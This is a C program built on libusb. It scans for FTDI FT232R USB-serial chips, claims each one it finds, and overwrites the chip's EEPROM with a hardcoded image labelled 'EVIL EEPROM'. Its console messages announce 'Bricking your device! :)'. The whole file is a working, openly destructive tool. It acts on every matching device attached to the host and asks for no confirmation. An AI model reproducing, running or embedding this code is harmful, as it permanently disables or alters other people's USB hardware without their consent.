#include <stdio.h>
#include <libusb-1.0/libusb.h>

unsigned char evil_eepr[] = {	// EVIL EEPROM
	0x02, 0x40, 0x03, 0x04, 0x01, 0x60, 0x00, 0x06, 0xA0, 0x2D, 0x08, 0x00,
	0x00, 0x02, 0x98, 0x0A, 0xA2, 0x20, 0xC2, 0x12, 0x23, 0x10, 0x05, 0x00,
	0x0A, 0x03, 0x46, 0x00, 0x54, 0x00, 0x44, 0x00, 0x49, 0x00, 0x20, 0x03,
	0x46, 0x00, 0x54, 0x00, 0x32, 0x00, 0x33, 0x00, 0x32, 0x00, 0x52, 0x00,
	0x20, 0x00, 0x55, 0x00, 0x53, 0x00, 0x42, 0x00, 0x20, 0x00, 0x55, 0x00,
	0x41, 0x00, 0x52, 0x00, 0x54, 0x00, 0x12, 0x03, 0x41, 0x00, 0x31, 0x00,
	0x30, 0x00, 0x4C, 0x00, 0x49, 0x00, 0x57, 0x00, 0x41, 0x00, 0x36, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xD4, 0x54 // last two bytes == checksum
};
	

struct usb_request
{
	uint8_t request_type;
	uint8_t bRequest;
	uint16_t wValue;
	uint16_t wIndex;
	unsigned char *data;
	uint16_t wLength;
	unsigned int timeout;
};

static void brickftdi(libusb_device **devs)
{
	libusb_device * dev;
	int i = 0;
	while ((dev = devs[i++]) != NULL)
	{
		struct libusb_device_descriptor desc;
		struct libusb_device_handle * hand;
		int r = libusb_get_device_descriptor(dev, &desc);
		if (r < 0)
		{
			fprintf(stderr, "Error with the descriptor %s\n", libusb_strerror(r));
			return;
		}

		if (desc.idVendor == 0x0403 && desc.idProduct == 0x6001)
		{
			puts("[+] FTDI 232R detected");

			int op = libusb_open(dev, &hand);
			if (op != 0)
			{
				fprintf(stderr, "Error opening the device: %s\n", libusb_strerror(op));
				continue;
			}

			libusb_set_auto_detach_kernel_driver(hand, 1);

			r = libusb_claim_interface(hand, 0);
			if (r < 0)
			{
				fprintf(stderr, "Cannot claim interface: %s\n", libusb_error_name(r));
				libusb_close(hand);
				continue;
			}

			struct usb_request msg;

			// Reset device
			msg.request_type = 0x40;
			msg.bRequest = 0x00;
			msg.wValue = 0x00;
			msg.wIndex = 0x01;
			msg.wLength = 0x00;
			msg.data = NULL;
			msg.timeout = 0x00;

			r = libusb_control_transfer(hand, msg.request_type, msg.bRequest, msg.wValue, msg.wIndex, msg.data, msg.wLength, msg.timeout);
			if (r >= 0)
			{
				puts("[+] Reseting your device :)");

				// Poll Modem
				msg.request_type = 0xC0;
				msg.bRequest = 0x05;
				msg.wValue = 0x00;
				msg.wIndex = 0x01;
				msg.wLength = 0x02;
				unsigned char buffer[2];
				msg.data = buffer;

				r = libusb_control_transfer(hand, msg.request_type, msg.bRequest, msg.wValue, msg.wIndex, msg.data, msg.wLength, msg.timeout);
				if (r >= 0)
				{
					puts("[+] Poll Modem done!");

					// Set latency
					msg.request_type = 0x40;
					msg.bRequest = 0x09;
					msg.wValue = 0x77;
					msg.wIndex = 0x01;
					msg.wLength = 0x00;
					msg.data = NULL;

					r = libusb_control_transfer(hand, msg.request_type, msg.bRequest, msg.wValue, msg.wIndex, msg.data, msg.wLength, msg.timeout);
					if (r >= 0)
					{
						puts("[+] Latency is now 0x77");

						// Write to EEPROM
						puts("[!] Bricking your device! :)");
						for (int i = 0; i < 0x40; i++)
						{
							msg.bRequest = 0x91;
							uint16_t valorB = (evil_eepr[(2 *i) + 1] << 8) | evil_eepr[(2 *i)];
							uint16_t indiceB = i;

							r = libusb_control_transfer(hand, msg.request_type, msg.bRequest, valorB, indiceB, NULL, msg.wLength, msg.timeout);

							if (r < 0)
							{
								fprintf(stderr, "Error writing to EEPROM at index %d: %s\n", i, libusb_strerror(r));
								break;
							}
						}

						puts("[!] Enjoy your new configured device!");
					}
					else
					{
						fprintf(stderr, "Error setting latency: %s\n", libusb_strerror(r));
					}
				}
				else
				{
					fprintf(stderr, "Error sending Poll Modem: %s\n", libusb_strerror(r));
				}
			}
			else
			{
				fprintf(stderr, "Error resetting the device: %s\n", libusb_strerror(r));
			}

			libusb_release_interface(hand, 0);
			libusb_close(hand);
		}
	}
}

int main()
{
	libusb_device **devs;
	libusb_context *ctx = NULL;

	int r = libusb_init(&ctx);
	if (r < 0)
	{
		fprintf(stderr, "Error at libusb startup: %s\n", libusb_strerror(r));
		return -1;
	}

	ssize_t cnt = libusb_get_device_list(ctx, &devs);
	if (cnt < 0)
	{
		fprintf(stderr, "Error requesting the list: %s\n", libusb_strerror(cnt));
		libusb_exit(ctx);
		return 1;
	}

	brickftdi(devs);
	libusb_free_device_list(devs, 1);
	libusb_exit(ctx);
	return 0;
}